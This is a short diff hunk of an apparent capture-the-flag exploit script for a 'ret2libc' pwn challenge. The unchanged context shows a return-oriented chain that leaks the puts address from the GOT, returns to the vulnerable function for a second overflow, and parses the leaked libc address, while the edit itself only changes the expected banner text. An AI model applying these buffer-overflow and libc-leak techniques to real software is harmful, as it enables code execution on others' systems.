@@ -33,7 +33,7 @@ payload1 += p64(puts_got)
 payload1 += p64(puts_plt)
 payload1 += p64(vuln)       # 泄漏后回到 vuln 进行第二次溢出
 
-r.recvuntil(b'Hello\n')
+r.recvuntil(b'=== SLsec Pwn: ret2libc ===\n')
 r.send(payload1)
 r.recvuntil(b'Bye\n')
 leak = u64(r.recv(6).ljust(8, b'\x00'))
